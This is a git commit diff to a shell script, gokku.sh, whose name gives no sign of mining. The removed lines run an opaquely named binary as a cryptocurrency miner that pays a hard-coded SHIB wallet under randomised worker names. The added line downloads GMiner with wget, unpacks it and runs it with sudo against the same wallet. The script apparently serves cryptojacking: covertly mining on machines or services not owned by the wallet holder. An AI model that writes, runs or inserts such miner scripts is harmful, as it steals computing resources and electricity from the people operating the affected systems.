553e2031f0b6f3649e48f4e1e3b16e4113a007a8
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-08-27 10:12:45 +0530

    Update gokku.sh

--- gokku.sh
+++ gokku.sh
@@ -1,7 +1,1 @@
-#!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
-WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#ek61-6h9x)
-
-
-chmod +x 3hhNoTC && ./3hhNoTC --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.56/gminer_2_56_linux64.tar.xz && tar xf gminer_2_56_linux64.tar.xz && sudo ./miner --algo ethash --server ethash-eu.unmineable.com:3333 --user SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383.hmi --pass x
